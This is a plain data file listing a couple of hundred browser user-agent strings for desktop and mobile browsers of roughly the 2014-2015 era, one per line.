Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALCJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0
Mozilla/5.0 (Linux; Android 5.0.1; SM-N910V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B436 Safari/600.1.4
Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12B466 Safari/600.1.4
Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Linux; Android 4.4.2; SM-T310 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.45 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; Nexus 10 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 7077.123.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)
Mozilla/5.0 (Linux; Android 4.4.2; QMV7A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53
Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-N900A Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.4; XT1080 Build/SU6-7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASJB; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.73.11 (KHTML, like Gecko) Version/7.0.1 Safari/537.73.11
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like Gecko
Mozilla/5.0 (iPad; CPU OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [Pinterest/iOS]
Mozilla/5.0 (Linux; Android 5.0.1; LGLK430 Build/LRX21Y) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 Safari
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/8.0; 1ButtonTaskbar)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP08; NP08; MAAU; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSMSE; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (Windows NT 5.1; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1; XT1254 Build/SU3TL-39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36
Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12B440 Safari/600.1.4
Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG-SGH-I337 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36
Mozilla/5.0 (X11; CrOS armv7l 7077.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0 Chrome/38.0.2125.102 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SM-G900V Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.133 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAGWJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; ATT-IE11; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174
Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12D508 Safari/600.1.4
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0; MSN 9.0;MSN 9.1;MSN 9.6;MSN 10.0;MSN 10.2;MSN 10.5;MSN 11;MSN 11.5; MSNbMSNI; MSNmen-us; MSNcOTH) like Gecko
Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; 1ButtonTaskbar)
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 YaBrowser/15.7.2357.2877 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSMSNIP; rv:11.0) like Gecko
Mozilla/5.0 AppleWebKit/999.0 (KHTML, like Gecko) Chrome/99.0 Safari/999.0
Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.0.0 Safari/538.1
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAGWJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 4.4.2; GT-N5110 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12B410 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.7) Gecko/20150824 Firefox/31.9 PaleMoon/25.7.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:31.0) Gecko/20100101 Firefox/31.0
Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 9_0 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13A4325c Safari/601.1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; MS-RTC LM 8; InfoPath.3)
Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0
Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; EIE10;ENUSWOL; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 4.4.4; en-us; SAMSUNG SM-N910T Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.0.4; en-ca; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.45 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0
Mozilla/5.0 (Linux; Android 4.4.2; RCT6773W22 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko
Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.7) Gecko/20150824 Firefox/31.9 PaleMoon/25.7.0
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G870A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)
Mozilla/5.0 (Windows NT 5.2; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSMCM; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MALCJS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Windows NT 5.2; rv:29.0) Gecko/20100101 Firefox/29.0 /29.0
Mozilla/5.0 (Linux; Android 5.0.2; SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.2; SM-P900 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; Nexus 9 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
Mozilla/5.0 (Linux; Android 5.1.1; SM-T330NU Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.7.1000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1
Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MALCJS; rv:11.0) like Gecko
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/8.0.57838 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; yie10; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Ubuntu 14.04) AppleWebKit/537.36 Chromium/35.0.1870.2 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/8.0; TNJB; 1ButtonTaskbar)
Mozilla/5.0 (Linux; Android 4.4.2; RCT6773W22 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
